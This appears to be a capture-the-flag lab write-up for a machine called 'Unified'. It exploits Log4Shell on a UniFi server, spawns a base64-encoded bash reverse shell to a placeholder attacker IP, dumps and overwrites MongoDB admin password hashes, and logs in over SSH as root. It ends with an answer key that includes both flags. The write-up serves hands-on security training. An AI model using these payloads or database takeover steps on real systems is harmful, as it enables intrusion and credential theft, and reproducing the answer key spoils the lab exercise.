# Unified

> IP: [10.129.239.238]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.239.238 -oN init_scan
      1. Port 22 -> ssh -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      2. Port 6789 -> ibm-db2-admin?
      3. Port 8080 -> http-proxy
      4. Port 8443 -> ssl/nagios-nsca Nagios NSCA
         1. http-title: UniFi Network
3. HTTP
   1. Navigate to website onport 8080
      1. We see login form and UniFi V6.4.54
4. RESEARCH
   1. Looking around for exploits for Unifi (specifically 6.4.54) we see a CVE-2021-44228
   2. Here is a great article that references this: "https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi"
   3. This looks to be using ldap and exploits the "Remember me" function of the login
5. FOLLOW CVE INSTRUCTIONS
   1. Lets test for our vulnerability
      1. BURPSUITE -> INTERCEPT -> SEND TO REPEATER
         1. Change our "remember" value to our local IP
            1. SEND
      2. Now lets check to see if the traffic infact was sent to our machine
         1. > tcpdump -i tun0 port 389
            1. SUCCESS!
   2. Lets download anf install the rogue-jndi tool (GitHub)
      1. > git clone "https://github.com/veracode-research/rogue-jndi.git"
      2. > mvn package
         1. This compiles the JAR file
   3. Now lets get our revshell payload and base64 encode it
      1. > echo 'bash -c bash -i >&/dev/tcp/MY_IP_ADDR/4444 0>&1' | base64
         1. RESPONSE: "YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvTVlfSVBfQUREUi80NDQ0IDA+JjEK"
   4. Now run our JAR file with our payload this starts the JNDI/LDAP server
      1. > java -jar ~/TOOLS/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvTVlfSVBfQUREUi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "MY_IP_ADDR"
   5. Now go back to burp and SEND again with our payload being "${jndi:ldap://MY_IP_ADDR:1389/o=tomcat}"
   6. NETCAT
      1. Now that our netcat lisnter got us a revshell lets stabilize it for bash
         1. > script /dev/null -c bash
         2. SUCCESS!
6. ENUMERATION
   1. Check users home directories
      1. > ls /home
         1. michael
      2. > ls /home/michael
         1. user.txt
      3. > cat /home/michael/user.txt
         1. FLAG: `6ced1a6a89e666c0620cdb10262ba127`
   2. Check for mongodb and other running services
      1. > ps auxfww

            ```text
                USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
                unifi          1  0.0  0.0   1080     4 ?        Ss   17:54   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi
                unifi          7  0.0  0.1  18512  3160 ?        S    17:54   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
                unifi         17  0.9 27.4 3678004 558668 ?      Sl   17:54   0:58  \_ java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start
                unifi         67  0.3  4.1 1101696 84872 ?       Sl   17:55   0:20      \_ bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
                unifi       2580  0.0  0.1  18380  3104 ?        S    19:25   0:00      \_ bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvTVlfSVBfQUREUi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}
                unifi       2584  0.0  0.1  18512  3380 ?        S    19:25   0:00          \_ bash -i
                unifi       2587  0.0  0.1  18380  3080 ?        S    19:25   0:00              \_ bash
                unifi       2601  0.0  0.1  19312  2332 ?        S    19:25   0:00                  \_ script /dev/null -c bash
                unifi       2602  0.0  0.0   4632   920 pts/0    Ss   19:25   0:00                      \_ sh -c bash
                unifi       2603  0.0  0.1  18512  3516 pts/0    S    19:25   0:00                          \_ bash
                unifi       2862  0.0  0.1  34408  2952 pts/0    R+   19:35   0:00                              \_ ps auxfww
            ```

            1. In here we can see MONGODB and the command has it running on --port 27117
            2. Lets connect to the mongodb
   3. MONGODB
      1. > mongo --port 27117
      2. > show dbs
         1. ace
         2. ace_stat
         3. admin
         4. config
         5. local
      3. > use ace
      4. > show collections
         1. In here we see several but the main one that stands out is "admin"
      5. > db.admin.find()
         1. We see a ton of data but the main things are the users and thier password hashes we see
            1. administrator:$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
            2. michael:$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0
            3. seamus:$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.
            4. warren:$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.
            5. james:$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1
   4. HASHES
      1. Lets try and identify these hashes
         1. The "$6$" makes it look like sha512crypt, SHA512 (Unix)
      2. So it looke like we cannot crack the hashes BUT we can run the db.update() function and set our own password
7. EXPLOIT
   1. We need to craft a SHA512 password for our admin user account in mongoDB
   2. Doing some googling and we see there is a command "mkapsswd" that will generate a hash for us
   3. HASH
      1. > mkpasswd -m sha-512 helloworld
         1. HASH: "$6$pqrVNIxxme1DguoI$LFSd6kIdj1tM8q.0BCu1y9xvOeS.uHcf04oCJbxrgA0RToUSOfZtvKAJ9U..ukRwTWABaERrFPIgZdEZj/T0O."
   4. Now update the database
      1. First lets get the exact user & field we will be updating
         1. "_id" : ObjectId("61ce278f46e0fb0012d47ee4") and the field is "x_shadow"
            1. {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$pqrVNIxxme1DguoI$LFSd6kIdj1tM8q.0BCu1y9xvOeS.uHcf04oCJbxrgA0RToUSOfZtvKAJ9U..ukRwTWABaERrFPIgZdEZj/T0O."}}
      2. > db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$pqrVNIxxme1DguoI$LFSd6kIdj1tM8q.0BCu1y9xvOeS.uHcf04oCJbxrgA0RToUSOfZtvKAJ9U..ukRwTWABaERrFPIgZdEZj/T0O."}})
   5. HTTP
      1. Now go back to the webpage and login with the admin account
         1. SUCCESS!
      2. We now see web-dashboard
      3. Lets look around
         1. Going to settings -> site
            1. In here we see a section "Enable SSH Authentication"
               1. UN: root
               2. PW: NotACrackablePassword4U2022
               3. So lets try ssh'ing in as ROOT
8. SSH
   1. > ssh root@10.129.239.238 
      1. PW: NotACrackablePassword4U2022
      2. SUCCESS!
   2. Get root flag
      1. > cat root.txt
         1. FLAG: `e50bc93c75b634e4b272d2f771c33681`

## QUESTIONS

1. Which are the first four open ports?
   1. `22, 6789, 8080, 8443`
2. What is the title of the software that is running running on port 8443?
   1. `UniFi Network`
3. What is the version of the software that is running?
   1. `6.4.54`
4. What is the CVE for the identified vulnerability?
   1. `CVE-2021-44228`
5. What protocol does JNDI leverage in the injection?
   1. `LDAP`
6. What tool do we use to intercept the traffic, indicating the attack was successful?
   1. `tcpdump`
7. What port do we need to inspect intercepted traffic for?
   1. `389`
8. What port is the MongoDB service running on?
   1. `27117`
9.  What is the default database name for UniFi applications?
    1. `ace`
10. What is the function we use to enumerate users within the database in MongoDB?
    1. `db.admin.find()`
11. What is the function we use to update users within the database in MongoDB?
    1. `db.admin.update()`
12. What is the password for the root user?
    1. `NotACrackablePassword4U2022`
13. Submit user flag
    1. `6ced1a6a89e666c0620cdb10262ba127`
14. Submit root flag
    1. `e50bc93c75b634e4b272d2f771c33681`
